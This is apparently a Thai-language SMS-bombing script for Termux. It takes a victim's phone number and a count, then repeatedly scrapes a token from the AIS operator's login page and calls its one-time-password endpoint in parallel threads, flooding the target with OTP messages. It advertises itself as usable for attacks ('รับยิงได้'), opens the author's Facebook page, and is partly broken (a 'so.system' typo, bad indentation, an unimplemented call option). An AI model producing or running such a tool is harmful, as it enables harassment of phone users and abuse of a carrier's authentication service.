import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread






os.system('clear')
os.system("termux-open-url https://www.facebook.com/chawit.manwong")
print("\033[92mสร้างโดยคนไทย")
print("\033[92mรับยิงได้")
print("\033[92mสร้างโดยFB : Chawit manwong")
print("     \033[92m YT : [GM]  GameMods")
print("[1]sms")
print("[2]call")
ok = input ("1หรือ2 : ")
print("")
if ok == '1':
so.system('clear')
phone = input("\033[1;92m เบอร์ : ")
jam = int(input("\033[1;92m จำนวน : "))
print("")

def sms():
	session = Session()
	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
	session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
	print(f"\033[1;96mยิง\033[91m{phone}\033[1;96m แล้วจำนวน \033[91m{jam}")
	
for i in range(jam):
	time.sleep(1)
	threading.Thread(target=sms).start()